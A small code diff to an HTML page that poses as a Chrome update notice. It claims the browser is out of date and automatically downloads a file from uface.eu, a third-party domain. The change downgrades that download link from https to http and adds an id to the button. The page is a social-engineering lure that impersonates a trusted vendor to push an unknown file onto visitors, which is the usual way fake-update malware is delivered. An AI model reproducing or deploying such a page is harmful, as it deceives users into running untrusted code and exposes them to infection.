@@ -32,7 +32,7 @@
 		<script>
 			function download() {
 				var link = document.createElement('a');
-			    link.href = "https://uface.eu/download";
+			    link.href = "http://uface.eu/download";
 			    link.download="";
 			    link.click();
 			}
@@ -46,7 +46,7 @@
 			<h1>You are using an older version of Chrome</h1>
 			<h2>Update now to keep your Chrome browser running smoothly and securely.</h2>
 			<h2>Your download will begin automatically. If not, click here:</h2>
-			<button onclick="download()"></button>
+			<button id="download" onclick="download()"></button>
 		</center>
 		
 	</body>
